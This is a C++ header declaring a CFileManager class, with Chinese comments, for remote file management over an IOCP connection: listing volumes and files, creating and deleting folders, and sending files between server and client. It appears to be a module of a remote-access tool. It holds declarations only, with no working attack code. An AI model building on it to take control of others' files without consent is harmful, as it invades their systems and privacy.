#pragma once
#include "Manager.h"

typedef struct
{
	DWORD	FileSizeHigh;
	DWORD	FileSizeLow;
}FILE_SIZE;

#define MAKEINT64(low, high) ((unsigned __int64)(((DWORD)(low)) | ((unsigned __int64)((DWORD)(high))) << 32))

class CFileManager : public CManager
{
public:
	CFileManager(_CIOCPClient* IOCPClient);
	~CFileManager();

public:
	char  m_FileFullPath[MAX_PATH];

	__int64 m_OperatingFileLength;//操作文件大小
	ULONG   m_TransferMode;
public:
	VOID CFileManager::HandleIO(PBYTE BufferData, ULONG BufferLength);
	ULONG CFileManager::SendClientVolumeList();
	int CFileManager::SendClientFilesList(PBYTE DirectoryPath);


	VOID CFileManager::CreateNewFloder(PBYTE BufferData, ULONG BufferLength);
	BOOL CFileManager::MakeSureDirectoryPathExists(char* DirectoryFullPath);
	BOOL CFileManager::DeleteDirectory(LPCTSTR DirectoryFullPath);

	/*************************  服务器向客户端拖拽文件         *********************/
	VOID CFileManager::CreateClientReceiveFileInfo(LPBYTE BufferData);
	VOID CFileManager::GetServerFileData();
	VOID CFileManager::SetTransferMode(LPBYTE BufferData);
	VOID CFileManager::WriteClientReceiveFile(LPBYTE BufferData, ULONG BufferLength);

	/*************************  客户端向服务器拖拽文件         *********************/
	BOOL CFileManager::FixedClientToServerDirectory(char* DircetoryFullPath);
	VOID CFileManager::GetTheFileInfo(PBYTE BufferData, int BufferLength);
	VOID CFileManager::SendFileData(PBYTE BufferData);

	ULONG   m_Counter; //通过偏移计算已经拷贝的长度
};

